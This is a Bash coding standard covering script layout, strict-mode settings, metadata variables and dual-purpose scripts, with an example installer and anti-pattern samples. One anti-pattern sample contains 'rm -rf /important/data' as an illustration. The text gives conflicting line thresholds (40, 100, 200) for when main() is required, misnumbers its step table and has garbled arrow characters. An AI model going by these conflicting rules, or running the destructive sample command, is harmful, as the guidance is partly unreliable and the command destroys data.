# Bash Coding Standard

Comprehensive Bash 5.2+ coding standard (not a compatibility standard).

"This isn't just a coding standard -- it's a systems engineering philosophy applied to Bash." -- Biksu Okusi

## Coding Principles
- K.I.S.S.
- "The best process is no process"
- "Everything should be made as simple as possible, but not simpler."

NOTE: Do not over-engineer scripts; remove unused functions and variables.

## Contents
1. [Script Structure & Layout](#script-structure--layout)
2. [Variable Declarations & Constants](#variable-declarations--constants)
3. [Variable Expansion & Parameter Substitution](#variable-expansion--parameter-substitution)
4. [Quoting & String Literals](#quoting--string-literals)
5. [Arrays](#arrays)
6. [Functions](#functions)
7. [Control Flow](#control-flow)
8. [Error Handling](#error-handling)
9. [Input/Output & Messaging](#inputoutput--messaging)
10. [Command-Line Arguments](#command-line-arguments)
11. [File Operations](#file-operations)
12. [Security Considerations](#security-considerations)
13. [Code Style & Best Practices](#code-style--best-practices)
14. [Advanced Patterns](#advanced-patterns)

BSC00


---


**Rule: BCS0100**

# Script Structure & Layout

Defines the mandatory 13-step structural layout for all Bash scripts: shebang through `#fin` marker, including metadata, shopt settings, dual-purpose patterns, FHS compliance, file extensions, and bottom-up function organization (low-level utilities before high-level orchestration).


---


**Rule: BCS010101**

### Complete Working Example

**Production-quality installation script demonstrating all 13 mandatory BCS0101 layout steps.**

---

## Complete Example: All 13 Steps

```bash
#!/bin/bash
#shellcheck disable=SC2034  # Some variables used by sourcing scripts
# Configurable installation script with dry-run mode and validation
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# ============================================================================
# Script Metadata
# ============================================================================

VERSION=2.1.420
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Global Variable Declarations
# ============================================================================

# Configuration (can be modified by arguments)
declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp
declare -- SYSTEM_USER=myapp

# Derived paths (updated when PREFIX changes)
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- SHARE_DIR="$PREFIX"/share
declare -- CONFIG_DIR=/etc/"$APP_NAME"
declare -- LOG_DIR=/var/log/"$APP_NAME"

# Runtime flags
declare -i DRY_RUN=0
declare -i FORCE=0
declare -i INSTALL_SYSTEMD=0

# Accumulation arrays
declare -a WARNINGS=()
declare -a INSTALLED_FILES=()

# ============================================================================
# Step 8: Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' BOLD=$'\033[1m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi

# ============================================================================
# Step 9: Utility Functions
# ============================================================================
declare -i VERBOSE=1

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
yn() {
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}

noarg() { (($# > 1)) || die 22 "Option ${1@Q} requires an argument"; }

# ============================================================================
# Step 10: Business Logic Functions
# ============================================================================

update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  SHARE_DIR="$PREFIX"/share
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
}

usage() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS]

OPTIONS:
  -p, --prefix DIR       Installation prefix (default: /usr/local)
  -u, --user USER        System user for service (default: myapp)
  -n, --dry-run          Show what would be done without doing it
  -f, --force            Overwrite existing files
  -s, --systemd          Install systemd service unit
  -v, --verbose          Enable verbose output
  -h, --help             Display this help message
  -V, --version          Display version information
EOF
}

check_prerequisites() {
  local -i missing=0
  local -- cmd

  for cmd in install mkdir chmod chown; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found ${cmd@Q}"
      missing=1
    fi
  done

  if ((INSTALL_SYSTEMD)) && ! command -v systemctl >/dev/null 2>&1; then
    error 'systemd installation requested but systemctl not found'
    missing=1
  fi

  ((missing==0)) || die 1 'Missing required commands'
  success 'All prerequisites satisfied'
}

validate_config() {
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ "$PREFIX" =~ [[:space:]] ]] && die 22 'PREFIX cannot contain spaces'

  [[ -n "$APP_NAME" ]] || die 22 'APP_NAME cannot be empty'
  [[ "$APP_NAME" =~ ^[a-z][a-z0-9_-]*$ ]] || \
    die 22 'Invalid APP_NAME: must start with letter, contain only lowercase, digits, dash, underscore'

  [[ -n "$SYSTEM_USER" ]] || die 22 'SYSTEM_USER cannot be empty'

  if [[ ! -d "$PREFIX" ]]; then
    if ((FORCE)) || yn "Create PREFIX directory '$PREFIX'?"; then
      vecho "Will create ${PREFIX@Q}"
    else
      die 1 'Installation cancelled'
    fi
  fi

  success 'Configuration validated'
}

create_directories() {
  local -- dir

  for dir in "$BIN_DIR" "$LIB_DIR" "$SHARE_DIR" "$CONFIG_DIR" "$LOG_DIR"; do
    if ((DRY_RUN)); then
      info "[DRY-RUN] Would create directory ${dir@Q}"
      continue
    fi

    if [[ -d "$dir" ]]; then
      vecho "Directory exists ${dir@Q}"
    else
      mkdir -p "$dir" || die 1 "Failed to create directory ${dir@Q}"
      success "Created directory ${dir@Q}"
    fi
  done
}

install_binaries() {
  local -- source="$SCRIPT_DIR/bin"
  local -- target="$BIN_DIR"

  [[ -d "$source" ]] || die 2 "Source directory not found ${source@Q}"

  ((DRY_RUN==0)) || {
    info "[DRY-RUN] Would install binaries from ${source@Q} to ${target@Q}"
    return 0
  }

  local -- file
  local -i count=0

  for file in "$source"/*; do
    [[ -f "$file" ]] || continue

    local -- basename=${file##*/}
    local -- target_file="$target/$basename"

    if [[ -f "$target_file" ]] && ! ((FORCE)); then
      warn "File exists (use --force to overwrite) ${target_file@Q}"
      continue
    fi

    install -m 755 "$file" "$target_file" || die 1 "Failed to install ${basename@Q}"
    INSTALLED_FILES+=("$target_file")
    count+=1
    vecho "Installed ${target_file@Q}"
  done

  success "Installed $count binaries to ${target@Q}"
}

# ============================================================================
# Step 11: main() Function
# ============================================================================

main() {
  while (($#)); do
    case $1 in
      -p|--prefix)       noarg "$@"; shift; PREFIX=$1; update_derived_paths ;;
      -u|--user)         noarg "$@"; shift; SYSTEM_USER=$1 ;;
      -n|--dry-run)      DRY_RUN=1 ;;
      -f|--force)        FORCE=1 ;;
      -s|--systemd)      INSTALL_SYSTEMD=1 ;;
      -v|--verbose)      VERBOSE=1 ;;
      -h|--help)         usage; return 0 ;;
      -V|--version)      echo "$SCRIPT_NAME $VERSION"; return 0 ;;
      -*)                die 22 "Invalid option ${1@Q} (use --help for usage)" ;;
      *)                 die 2  "Unexpected argument ${1@Q}" ;;
    esac
    shift
  done

  # Make configuration readonly after argument parsing
  readonly -- PREFIX APP_NAME SYSTEM_USER
  readonly -- BIN_DIR LIB_DIR SHARE_DIR CONFIG_DIR LOG_DIR
  readonly -i VERBOSE DRY_RUN FORCE INSTALL_SYSTEMD

  ((DRY_RUN==0)) || info 'DRY-RUN mode enabled - no changes will be made'

  info "Installing $APP_NAME $VERSION to ${PREFIX@Q}"

  check_prerequisites
  validate_config
  create_directories
  install_binaries

  if ((DRY_RUN)); then
    info 'Dry-run complete - review output and run without --dry-run to install'
  else
    success "Installation of $APP_NAME $VERSION complete!"
  fi
}

main "$@"

#fin
```

---

## Key Patterns Demonstrated

| Pattern | Implementation |
|---------|----------------|
| **13-step structure** | Shebang �' shellcheck �' description �' strict mode �' shopt �' metadata �' globals �' colors �' utilities �' business logic �' main() �' invocation �' #fin |
| **Progressive readonly** | Variables mutable during parsing, immutable after |
| **Derived paths** | `update_derived_paths()` recalculates when PREFIX changes |
| **Dry-run mode** | Every operation checks `DRY_RUN` flag before executing |
| **Force mode** | Existing files warn unless `--force` specified |
| **TTY-aware colors** | Conditional based on `[[ -t 1 && -t 2 ]]` |
| **Validation first** | Prerequisites and config validated before filesystem ops |
| **Error accumulation** | Warnings collected in array for summary reporting |


---


**Rule: BCS010102**

### Common Layout Anti-Patterns

**Common violations of BCS0101 13-step layout with incorrect approach and correct solution.**

---

## Anti-Patterns

### ✗ Missing `set -euo pipefail`

```bash
#!/usr/bin/env bash

# Script starts without error handling
VERSION=1.0.0

# Commands can fail silently
rm -rf /important/data
cp config.txt /etc/
```

**Problem:** Errors not caught, script continues after failures.

### ✓ Correct: Error Handling First

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose

VERSION=1.0.0
```

---

### ✗ Variables Declared After Use

```bash
#!/usr/bin/env bash
set -euo pipefail

main() {
  ((VERBOSE)) && echo 'Starting...' ||:  # VERBOSE not declared!
  process_files
}

declare -i VERBOSE=0  # Too late

main "$@"
#fin
```

**Problem:** "unbound variable" errors with `set -u`.

### ✓ Correct: Declare Before Use

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  ((VERBOSE)) && echo 'Starting...' ||:
  process_files
}

main "$@"
#fin
```

---

### ✗ Business Logic Before Utilities

```bash
#!/usr/bin/env bash
set -euo pipefail

process_files() {
  local -- file
  for file in *.txt; do
    [[ -f "$file" ]] || die 2 "Not a file ${file@Q}"  # die() not defined!
  done
}

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

main() { process_files; }

main "$@"
#fin
```

**Problem:** Violates bottom-up organization, harder to understand.

### ✓ Correct: Utilities Before Business Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

process_files() {
  local -- file
  for file in *.txt; do
    [[ -f "$file" ]] || die 2 "Not a file ${file@Q}"
  done
}

main() { process_files; }

main "$@"
#fin
```

---

### ✗ No `main()` in Large Script

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION=1.0.0
# ... 200 lines of functions ...

if [[ "$1" == '--help' ]]; then
  echo 'Usage: ...'
  exit 0
fi

check_prerequisites
validate_config
install_files
echo 'Done'
#fin
```

**Problem:** No clear entry point, scattered argument parsing, can't source to test functions.

### ✓ Correct: Use `main()` for Scripts Over 40 Lines

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION=1.0.0

main() {
  while (($#)); do
    case $1 in
      -h|--help) usage; exit 0 ;;
      *) die 22 "Invalid argument ${1@Q}" ;;
    esac
    shift
  done

  check_prerequisites
  validate_config
  install_files
  success 'Installation complete'
}

main "$@"
#fin
```

---

### ✗ Missing End Marker

```bash
#!/usr/bin/env bash
set -euo pipefail

main() { echo 'Hello, World!'; }

main "$@"
# File ends without #fin
```

**Problem:** No visual confirmation file is complete, harder to detect truncation.

### ✓ Correct: Always End With `#fin`

```bash
#!/usr/bin/env bash
set -euo pipefail

main() { echo 'Hello, World!'; }

main "$@"
#fin
```

---

### ✗ Readonly Before Parsing Arguments

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION=1.0.0
PREFIX=/usr/local
readonly -- VERSION PREFIX  # Too early!

main() {
  while (($#)); do
    case $1 in
      --prefix) shift; PREFIX="$1" ;;  # Fails - readonly!
    esac
    shift
  done
}

main "$@"
#fin
```

### ✓ Correct: Readonly After Argument Parsing

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION=1.0.0
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_NAME  # Never change

declare -- PREFIX=/usr/local  # Modified during parsing

main() {
  while (($#)); do
    case $1 in
      --prefix) shift; PREFIX=$1 ;;
    esac
    shift
  done
  readonly -- PREFIX  # Now lock it
}

main "$@"
#fin
```

---

### ✗ Mixing Declaration and Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

declare -i VERBOSE=0

check_something() { echo 'Checking...'; }

declare -- PREFIX=/usr/local  # Globals scattered!
declare -- CONFIG_FILE=''

main() { check_something; }
main "$@"
#fin
```

### ✓ Correct: All Globals Together

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION=1.0.0
declare -i VERBOSE=0
declare -- PREFIX=/usr/local
declare -- CONFIG_FILE=''

check_something() { echo 'Checking...'; }

main() { check_something; }
main "$@"
#fin
```

---

### ✗ Sourcing Without Protecting Execution

```bash
#!/usr/bin/env bash
set -euo pipefail  # Modifies caller's shell!

die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

main "$@"  # Runs automatically when sourced!
#fin
```

### ✓ Correct: Dual-Purpose Script

```bash
#!/usr/bin/env bash

error() { >&2 echo "ERROR: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0  # Exit if sourced

set -euo pipefail

VERSION=1.0.0
SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_NAME

main() { echo 'Running main'; }

main "$@"
#fin
```

---

## Summary

Eight anti-patterns violating BCS0101:

| Anti-Pattern | Consequence |
|-------------|-------------|
| Missing strict mode | Scripts fail silently |
| Late declaration | Unbound variable errors |
| Wrong function order | Violates bottom-up organization |
| Missing main() | No testable entry point |
| Missing end marker | Can't detect truncation |
| Premature readonly | Breaks argument parsing |
| Scattered declarations | Hard to see all state |
| Unprotected sourcing | Modifies caller's shell |


---


**Rule: BCS010103**

### Edge Cases and Variations

**Subrule covering scenarios where the standard 13-step BCS0101 layout may be modified.**

---

## When to Skip `main()` Function

**Small scripts under 200 lines** can skip `main()` and run directly:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Simple file counter - only 20 lines total
declare -i count=0

for file in "$@"; do
  [[ ! -f "$file" ]] || count+=1
done

echo "Found $count files"
#fin
```

## Sourced Library Files

**Files meant only to be sourced** skip execution parts and `set -e` (would affect caller):

```bash
#!/usr/bin/env bash
# Library of utility functions - meant to be sourced, not executed

# Don't use set -e when sourced (would affect caller)
# Don't make variables readonly (caller might need to modify)

is_integer() { [[ "$1" =~ ^-?[0-9]+$ ]]; }

is_valid_email() { [[ "$1" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; }

# No main(), no execution
# Just function definitions for other scripts to use
#fin
```

## Scripts With External Configuration

**When sourcing config files**, make readonly after sourcing:

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION=1.0.0
: ...

# Default configuration
declare -- CONFIG_FILE="${XDG_CONFIG_HOME:-$HOME/.config}"/myapp/config.sh
declare -- DATA_DIR="${XDG_DATA_HOME:-$HOME/.local/share}"/myapp

# Source config file if it exists and can be read
if [[ -r "$CONFIG_FILE" ]]; then
  #shellcheck source=/dev/null
  source "$CONFIG_FILE" || die 1 "Failed to source config ${CONFIG_FILE@Q}"
fi

# Now make readonly after sourcing config
readonly -- CONFIG_FILE DATA_DIR

# ... rest of script
```

## Platform-Specific Sections

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION=1.0.0
: ...

# Detect platform
declare -- PLATFORM
case $(uname -s) in
  Darwin) PLATFORM=macos ;;
  Linux)  PLATFORM=linux ;;
  *)      PLATFORM=unknown ;;
esac
readonly -- PLATFORM

# Platform-specific global variables
case $PLATFORM in
  macos)
    declare -- PACKAGE_MANAGER=brew
    declare -- INSTALL_CMD='brew install'
    ;;
  linux)
    declare -- PACKAGE_MANAGER=apt
    declare -- INSTALL_CMD='apt-get install'
    ;;
  *)
    die 1 "Unsupported platform ${PLATFORM@Q}"
    ;;
esac

readonly -- PACKAGE_MANAGER INSTALL_CMD

: ... rest of script
```

## Scripts With Cleanup Requirements

**Trap should be set** after cleanup function is defined but before code that creates temp files:

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION=1.0.0
: ...

# Temporary files array for cleanup
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=${1:-$?}
  local -- file

  for file in "${TEMP_FILES[@]}"; do
    [[ ! -f "$file" ]] || rm -f "$file"
  done

  return "$exit_code"
}

# Set trap early, after functions are defined
trap 'cleanup $?' SIGINT SIGTERM EXIT

# ... rest of script uses TEMP_FILES
```

---

## When to Deviate from Standard Layout

### Simplifications
- **Tiny scripts (<200 lines)** - Skip `main()`, run code directly
- **Library files** - Skip `set -e`, `main()`, script invocation
- **One-off utilities** - May skip color definitions, verbose messaging

### Extensions
- **External configuration** - Add config sourcing between metadata and business logic
- **Platform detection** - Add platform-specific globals after standard globals
- **Cleanup traps** - Add trap setup after utility functions but before business logic
- **Logging setup** - May add log file initialization after metadata
- **Lock files** - Add lock acquisition/release around main execution

### Key Principles

1. **Safety first** - `set -euo pipefail` still comes first (unless library file)
2. **Dependencies before usage** - Bottom-up organization still applies
3. **Clear structure** - Readers should easily understand the flow
4. **Minimal deviation** - Only deviate when there's clear benefit
5. **Document reasons** - Comment why you're deviating from standard

### Anti-Pattern: Arbitrary Reordering

```bash
# ✗ Wrong - arbitrary reordering without reason
#!/usr/bin/env bash

# Functions before set -e
validate_input() { : ... }

set -euo pipefail  # Too late!

# Globals scattered
VERSION=1.0.0
check_system() { : ... }
declare -- PREFIX=/usr
```

```bash
# ✓ Correct - standard order maintained
#!/usr/bin/env bash
set -euo pipefail

VERSION=1.0.0
declare -- PREFIX=/usr

validate_input() { : ... }
check_system() { : ... }
```

---

## Summary

**Legitimate simplifications:** Tiny scripts (<200 lines), libraries, one-off utilities

**Legitimate extensions:** External config, platform detection, cleanup traps, logging, lock files

**Core principles always apply:** Error handling first, dependencies before usage, clear structure

Deviate only when necessary—maintain **safety, clarity, and maintainability**.


---


**Rule: BCS0101**

## General Layouts for Standard Script

**All Bash scripts follow a 13-step structural layout ensuring consistency, maintainability, and correctness. Bottom-up organization places low-level utilities before high-level orchestration, allowing each component to safely call previously defined functions.**

For detailed examples: **BCS010101** (462-line example), **BCS010102** (anti-patterns), **BCS010103** (edge cases).

---

## Rationale

1. **Predictability** - Developers know where to find components: metadata (step 6), utilities (step 9), business logic (step 10)
2. **Safe Initialization** - Error handling configured before commands run; metadata available before functions execute
3. **Bottom-Up Dependency Resolution** - Lower-level components defined before higher-level ones
4. **Testing/Maintenance** - Source scripts to test functions; extract utilities for reuse
5. **Error Prevention** - Prevents undefined functions, uninitialized variables, premature business logic
6. **Documentation Through Structure** - Progression from infrastructure (1-8) �' implementation (9-10) �' orchestration (11-12)

---

## The 13 Mandatory Steps

### Step 1: Shebang
```bash
#!/bin/bash
```
**Alternatives:** `#!/usr/bin/bash` or `#!/usr/bin/env bash` (portable, respects PATH)

### Step 2: ShellCheck Directives (if needed)
```bash
#shellcheck disable=SC2034  # Unused variables OK (sourced by other scripts)
```
Always include explanatory comments for disabled checks.

### Step 3: Brief Description Comment
```bash
# Comprehensive installation script with configurable paths and dry-run mode
```

### Step 4: `set -euo pipefail`
```bash
set -euo pipefail
```
- `set -e` - Exit on command failure
- `set -u` - Exit on undefined variable
- `set -o pipefail` - Pipelines fail if any command fails

**Optional Bash 5 test** (immediately after, if needed):
```bash
((${BASH_VERSINFO[0]:-0} > 4)) || { >&2 echo 'error: Require Bash version >= 5'; exit 95; }
```

### Step 5: `shopt` Settings
```bash
shopt -s inherit_errexit shift_verbose extglob nullglob
```
- `inherit_errexit` - Subshells inherit `set -e`
- `shift_verbose` - Catches argument parsing bugs
- `extglob` - Extended pattern matching: `@(pattern)`, `!(pattern)`
- `nullglob` - Empty globs expand to nothing

### Step 6: Script Metadata
```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```
SC2155 safely ignored with `realpath`. On BCS systems, `realpath` may be a builtin (10x faster).

### Step 7: Global Variable Declarations
```bash
declare -- PREFIX=/usr/local
declare -- CONFIG_FILE=''
declare -i VERBOSE=0 DRY_RUN=0 FORCE=0
declare -a INPUT_FILES=()
declare -A OPTIONS=()
```
Type declarations: `-i` integers, `--` strings, `-a` indexed arrays, `-A` associative arrays.

### Step 8: Color Definitions (if terminal output)
```bash
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```
Skip if script doesn't use colored output.

### Step 9: Utility Functions
```bash
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
yn() {
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo; [[ ${REPLY,,} == y ]]
}
```

**Simplified messaging** (no color/verbosity):
```bash
info() { >&2 echo "${FUNCNAME[0]}: $*"; }
error() { >&2 echo "${FUNCNAME[0]}: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

### Step 10: Business Logic Functions
```bash
check_prerequisites() {
  local -i missing=0
  local -- cmd
  for cmd in git make gcc; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      error "Required command not found ${cmd@Q}"
      missing+=1
    fi
  done
  ((missing==0)) || die 1 "Missing $missing required commands"
}

install_files() {
  local -- source_dir=$1 target_dir=$2
  if ((DRY_RUN)); then
    info "[DRY-RUN] Would install from ${source_dir@Q} to ${target_dir@Q}"
    return 0
  fi
  mkdir -p "$target_dir" || die 1 "Failed to create ${target_dir@Q}"
  cp -r "$source_dir"/* "$target_dir"/
}
```
Organize bottom-up: validation �' file operations �' orchestration.

### Step 11: `main()` Function
```bash
main() {
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"; shift; PREFIX=$1 ;;
      -v|--verbose)  VERBOSE+=1 ;;
      -n|--dry-run)  DRY_RUN=1 ;;
      -V|--version)  echo "$SCRIPT_NAME $VERSION"; return 0 ;;
      -h|--help)     usage; return 0 ;;
      -[pvnVh]*)     #shellcheck disable=SC2046
                     set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
      -*)            die 22 "Invalid option ${1@Q}" ;;
      *)             INPUT_FILES+=("$1") ;;
    esac
    shift
  done
  readonly -- PREFIX
  readonly -i VERBOSE DRY_RUN

  check_prerequisites
  install_files "$SCRIPT_DIR"/data "$PREFIX"/share
}
```
**Required for scripts >100 lines.** Single entry point for testing/debugging.

### Step 12: Script Invocation
```bash
main "$@"
```

### Step 13: End Marker
```bash
#fin
```
Or `#end`. Confirms script is complete (not truncated).

---

## Structure Summary Tables

### Executable Scripts
| Step | Status | Element |
|------|--------|---------|
| 0 | Man | Shebang |
| 1 | Opt | ShellCheck directives |
| 2 | Opt | Description comment |
| 3 | Man | `set -euo pipefail` |
| 4 | Opt | Bash 5 version test |
| 5 | Rec | `shopt` settings |
| 6 | Rec | Script metadata |
| 7 | Rec | Global declarations |
| 8 | Rec | Color definitions |
| 9 | Rec | Utility functions |
| 10 | Rec | Business logic |
| 11 | Rec | `main()` function |
| 12 | Rec | `main "$@"` |
| 13 | Man | `#end` marker |

### Module/Library Scripts
Skip steps 3, 5, 11, 12. Add `#end` marker.

### Combined Module-Executable
Add guard: `[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0`
Then repeat steps 3-13 for executable section.

---

## Anti-Patterns

1. **Missing `set -euo pipefail`** - Must be first command
2. **Variables used before declaration** - Declare all globals in step 7
3. **Business logic before utilities** - Utilities must exist before callers
4. **No `main()` in large scripts** - Required for testability
5. **Missing end marker** - `#fin` or `#end` mandatory

See **BCS010102** for corrections.

---

## Edge Cases

1. **Tiny scripts (<100 lines)** - May skip `main()`
2. **Sourced libraries** - Skip `set -e`, `main()`, invocation
3. **External configuration** - Add config sourcing after metadata

See **BCS010103** for details.

---

## Summary

The 13-step layout guarantees safety, consistency, testability, and maintainability. For scripts >100 lines, implement all steps. For smaller scripts, steps 11-12 optional. Deviations should be rare and justified.


---


**Rule: BCS010201**

### Dual-Purpose Scripts (Executable and Sourceable)

Scripts designed to work both as executables and sourceable libraries must apply `set -euo pipefail` and `shopt` settings **ONLY** when executed directly, **NOT** when sourced.

**Rationale:** Sourcing a script that applies `set -e` or modifies `shopt` alters the caller's shell environment, potentially breaking error handling or glob behavior. Sourced scripts should only provide functions and variables without side effects.

**Recommended pattern (early return):**
```bash
#!/bin/bash
# Description of dual-purpose script

# Function definitions (available in both modes)
my_function() {
  local -- arg="$1"
  [[ -n "$arg" ]] || return 1
  echo "Processing: $arg"
}
declare -fx my_function

# Early return for sourced mode - stops here when sourced
[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0

# -----------------------------------------------------------------------------
# Executable code starts here (only runs when executed directly)
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Metadata initialization with guard (allows re-sourcing safety)
if [[ ! -v SCRIPT_VERSION ]]; then
  declare -x SCRIPT_VERSION=1.0.0
  declare -x SCRIPT_PATH=$(realpath -- "$0")
  declare -x SCRIPT_DIR=${SCRIPT_PATH%/*}
  declare -x SCRIPT_NAME=${SCRIPT_PATH##*/}
  readonly -- SCRIPT_VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
fi

# Helper functions (only needed for executable mode)
show_help() {
  cat <<EOT
$SCRIPT_NAME $SCRIPT_VERSION - Description

Usage: $SCRIPT_NAME [options] [arguments]
EOT
}

# Main execution logic
my_function "$@"

#fin
```

**Pattern structure:**
1. **Functions first** - Define all library functions at top; export with `declare -fx` if needed
2. **Early return** - `[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0` (sourced: load functions then exit; executed: continue)
3. **Visual separator** - Comment line marks executable section boundary
4. **Set/shopt** - Only applied when executed, immediately after separator
5. **Metadata guard** - `[[ ! -v SCRIPT_VERSION ]]` prevents re-initialization; safe to source multiple times

**Alternative (if/else) for different initialization per mode:**
```bash
#!/bin/bash

process_data() { ... }
declare -fx process_data

if [[ ${BASH_SOURCE[0]} == "$0" ]]; then
  # EXECUTED MODE
  set -euo pipefail
  DATA_DIR=/var/lib/myapp
  process_data "$DATA_DIR"
else
  # SOURCED MODE - different initialization
  DATA_DIR=${DATA_DIR:-/tmp/test_data}
fi
```

**Key principles:**
- Prefer early return pattern for simplicity
- Place all function definitions **before** sourced/executed detection
- Only apply `set -euo pipefail` and `shopt` in executable section
- Use `return` (not `exit`) for errors when sourced
- Guard metadata with `[[ ! -v VARIABLE ]]` for idempotence
- Test both modes: `./script.sh` and `source script.sh`

**Use cases:** Utility libraries with CLI demo, scripts providing reusable functions plus CLI, test frameworks sourceable for functions or runnable for tests.


---


**Rule: BCS0102**

## Shebang and Initial Setup

First lines require: shebang, optional shellcheck directives, brief description, then `set -euo pipefail`.

```bash
#!/bin/bash
#shellcheck disable=SC1090,SC1091
# Get directory sizes and report usage statistics
set -euo pipefail
```

**Allowable shebangs:**
1. `#!/bin/bash` - Most portable for Linux
2. `#!/usr/bin/bash` - BSD systems
3. `#!/usr/bin/env bash` - Maximum portability (searches PATH)

**Rationale:** `set -euo pipefail` must be first command to enable strict error handling before any other commands execute.


---


**Rule: BCS0103**

## Script Metadata

**Every script must declare standard metadata variables (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) immediately after `shopt` settings and before any other code. Declare them as readonly using `declare -r`.**

**Rationale:**
- **Reliable Path Resolution**: `realpath` provides canonical absolute paths and fails early if script doesn't exist
- **Self-Documentation**: VERSION provides versioning for deployment and debugging
- **Resource Location**: SCRIPT_DIR enables reliable loading of companion files and configuration
- **Logging**: SCRIPT_NAME provides consistent script identification in logs and errors
- **Defensive Programming**: Readonly prevents accidental modification that could break resource loading

**Standard metadata pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata - immediately after shopt
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Rest of script follows
```

**Metadata variables:**

